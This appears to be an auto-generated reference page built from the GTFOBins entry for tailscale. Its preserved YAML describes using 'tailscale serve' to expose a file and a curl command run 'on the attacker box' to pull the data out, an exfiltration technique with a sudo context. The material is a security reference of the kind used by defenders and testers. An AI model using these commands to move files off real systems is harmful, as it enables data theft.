---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tailscale

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tailscale` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tailscale` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [tailscale](../../tools/linux/tailscale.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | tailscale |
| name | tailscale |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/tailscale/ |

## Preserved Source Material

```yaml
_body: ''
_name: tailscale
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tailscale
functions:
  upload:
  - code: tailscale serve --http=12345 /path/to/input-file
    comment: The URL is reachable by any host of the same Tailnet.
    contexts:
      sudo: null
    receiver:
      code: curl http://<hostname>.<tailnet>.ts.net:12345/ -o /path/to/output-file
      comment: 'An HTTP client can be used on the attacker box to receive the data.


        The actual URL is returned by the command.'
```
